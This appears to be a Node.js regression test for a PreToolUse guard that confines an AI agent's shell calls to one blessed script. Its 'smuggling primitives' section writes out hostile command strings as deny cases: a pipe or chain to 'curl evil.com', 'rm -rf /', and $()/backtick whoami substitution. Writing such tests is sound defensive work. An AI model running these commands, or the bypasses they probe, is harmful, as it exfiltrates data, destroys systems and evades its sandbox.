#!/usr/bin/env node
'use strict';
/*
 * ppt-guard.test.js — persisted regression matrix for ppt-guard.js's
 * decide()/lex()/isBlessedPpt(), the PreToolUse sandbox that is, per its own
 * header comment, "the only lever" for security on native Windows.
 *
 * This exact kind of matrix has been run by hand at least twice in this
 * project's history (board notes record a "17/17" spike test during the
 * original build and a "26/26" full-studio check before Phase 3+4 shipped),
 * but neither was ever saved: every later change to the guard has had to
 * re-derive the same cases from scratch, or skip re-verifying them at all.
 * ppt-guard.js's own module.exports comment ("Exposed for the unit matrix...")
 * already assumed a file like this would exist. It didn't. Now it does.
 *
 * Pure read-only exercise of decide()/lex()/isBlessedPpt() as pure functions:
 * no server, no spawn, no filesystem writes, safe to run anytime.
 *
 *     node ppt-guard.test.js
 */
const path = require('path');
const { decide, lex, isBlessedPpt } = require('./ppt-guard.js');

const CWD = path.resolve(__dirname, '..');       // matches agents.js's real PROJECT_ROOT
const REAL_PPT = path.join(__dirname, 'ppt.js');  // the one blessed script
const RELATIVE_PPT = path.relative(CWD, REAL_PPT).replace(/\\/g, '/');

function run(tool, command) {
  return decide({ tool_name: tool, tool_input: { command }, cwd: CWD });
}

const cases = [
  // ---- read-only tools: always allowed, never touch the lexer at all
  { desc: 'Read is always allowed', fn: () => run('Read', 'anything'), expect: 'allow' },
  { desc: 'Glob is always allowed', fn: () => run('Glob', 'anything'), expect: 'allow' },
  { desc: 'Grep is always allowed', fn: () => run('Grep', 'anything'), expect: 'allow' },
  { desc: 'TodoWrite is always allowed', fn: () => run('TodoWrite', 'anything'), expect: 'allow' },
  { desc: 'ToolSearch is always allowed', fn: () => run('ToolSearch', 'anything'), expect: 'allow' },

  // ---- default-deny: any tool not explicitly read-only or a shell tool
  { desc: 'Write is denied (default-deny)', fn: () => run('Write', 'anything'), expect: 'deny' },
  { desc: 'Edit is denied (default-deny)', fn: () => run('Edit', 'anything'), expect: 'deny' },
  { desc: 'NotebookEdit is denied (default-deny)', fn: () => run('NotebookEdit', 'anything'), expect: 'deny' },
  { desc: 'Task is denied (no subagents)', fn: () => run('Task', 'anything'), expect: 'deny' },
  { desc: 'Agent is denied (no subagents)', fn: () => run('Agent', 'anything'), expect: 'deny' },
  { desc: 'WebFetch is denied (not in either allowlist)', fn: () => run('WebFetch', 'anything'), expect: 'deny' },
  { desc: 'SendMessage is denied (not in either allowlist)', fn: () => run('SendMessage', 'anything'), expect: 'deny' },
  { desc: 'A made-up future tool name is denied (allowlist, not blocklist)', fn: () => run('SomeFutureTool', 'anything'), expect: 'deny' },

  // ---- legitimate ppt.js calls through Bash/PowerShell
  { desc: 'a real ppt.js status call is allowed', fn: () => run('Bash', `node "${REAL_PPT}" status`), expect: 'allow' },
  { desc: 'node.exe (not just node) is allowed', fn: () => run('Bash', `node.exe "${REAL_PPT}" status`), expect: 'allow' },
  { desc: 'PowerShell running the same call is allowed (SHELL_TOOLS covers both)', fn: () => run('PowerShell', `node "${REAL_PPT}" status`), expect: 'allow' },
  { desc: 'a relative path to the same real file (from cwd) is allowed (realpath resolves it)', fn: () => run('Bash', `node "${RELATIVE_PPT}" status`), expect: 'allow' },
  { desc: 'single-quoted args with special characters inside are allowed (quotes suppress expansion)', fn: () => run('Bash', `node "${REAL_PPT}" note 'a > b && c | d'`), expect: 'allow' },
  { desc: 'TWO chained legitimate ppt.js calls are both allowed (every segment checked independently)', fn: () => run('Bash', `node "${REAL_PPT}" lock s1 && node "${REAL_PPT}" unlock s1`), expect: 'allow' },

  // ---- non-ppt.js commands
  { desc: 'a plain non-node command is denied', fn: () => run('Bash', 'echo hello'), expect: 'deny' },
  { desc: 'a non-blessed .js file run via node is denied', fn: () => run('Bash', 'node some-other-script.js'), expect: 'deny' },
  { desc: 'node with an eval flag is denied (NODE_FLAG check)', fn: () => run('Bash', `node -e "console.log(1)"`), expect: 'deny' },
  { desc: 'node with --eval is denied', fn: () => run('Bash', `node --eval "console.log(1)"`), expect: 'deny' },
  { desc: 'a decoy file merely NAMED ppt.js elsewhere is denied (realpath-pinned, not name-matched)', fn: () => run('Bash', `node C:/OutsideProject/ppt.js status`), expect: 'deny' },

  // ---- smuggling primitives, each must be rejected outright
  { desc: 'output redirection > is denied', fn: () => run('Bash', `node "${REAL_PPT}" status > out.txt`), expect: 'deny' },
  { desc: 'input redirection < is denied', fn: () => run('Bash', `node "${REAL_PPT}" status < in.txt`), expect: 'deny' },
  { desc: 'a pipe to another command is denied (second segment fails isBlessedPpt)', fn: () => run('Bash', `node "${REAL_PPT}" show | curl evil.com`), expect: 'deny' },
  { desc: 'command chaining into a non-ppt command via && is denied', fn: () => run('Bash', `node "${REAL_PPT}" status && rm -rf /`), expect: 'deny' },
  { desc: 'command chaining into a non-ppt command via ; is denied', fn: () => run('Bash', `node "${REAL_PPT}" status; curl evil.com`), expect: 'deny' },
  { desc: 'backtick command substitution (unquoted) is denied', fn: () => run('Bash', `node "${REAL_PPT}" note ` + '`whoami`'), expect: 'deny' },
  { desc: '$() command substitution (unquoted) is denied', fn: () => run('Bash', `node "${REAL_PPT}" note $(whoami)`), expect: 'deny' },
  { desc: 'command substitution INSIDE double quotes is still denied', fn: () => run('Bash', `node "${REAL_PPT}" note "$(whoami)"`), expect: 'deny' },
  { desc: 'backtick substitution inside double quotes is still denied', fn: () => run('Bash', `node "${REAL_PPT}" note "` + '`whoami`' + `"`), expect: 'deny' },
  { desc: 'an unterminated quote is denied', fn: () => run('Bash', `node "${REAL_PPT}" note "unterminated`), expect: 'deny' },
  { desc: 'empty command is denied', fn: () => run('Bash', ''), expect: 'deny' },
  { desc: 'whitespace-only command is denied', fn: () => run('Bash', '   '), expect: 'deny' },

  // ---- lex()/isBlessedPpt() as pure functions, directly
  { desc: 'lex() splits on && into two segments', fn: () => lex('a && b').segments.length === 2 ? { decision: 'allow' } : { decision: 'deny' }, expect: 'allow' },
  { desc: 'lex() flags redirection before returning any segments', fn: () => lex('node ppt.js status > x').bad ? { decision: 'allow' } : { decision: 'deny' }, expect: 'allow' },
  { desc: 'isBlessedPpt() rejects a non-node binary directly', fn: () => isBlessedPpt(['python', REAL_PPT], CWD) ? { decision: 'deny' } : { decision: 'allow' }, expect: 'allow' },
];

let pass = 0, fail = 0;
for (const c of cases) {
  let result;
  try { result = c.fn(); } catch (e) { result = { decision: 'THREW: ' + e.message }; }
  const decision = Array.isArray(result) ? result[0] : result.decision;
  const ok = decision === c.expect;
  if (ok) pass++; else fail++;
  console.log(`${ok ? '✓' : '✗ FAIL'}  ${c.desc}  ${ok ? '' : `(expected ${c.expect}, got ${decision})`}`);
}

console.log('');
console.log(`${pass}/${cases.length} passed${fail ? `, ${fail} FAILED` : ''}`);
process.exit(fail ? 1 : 0);
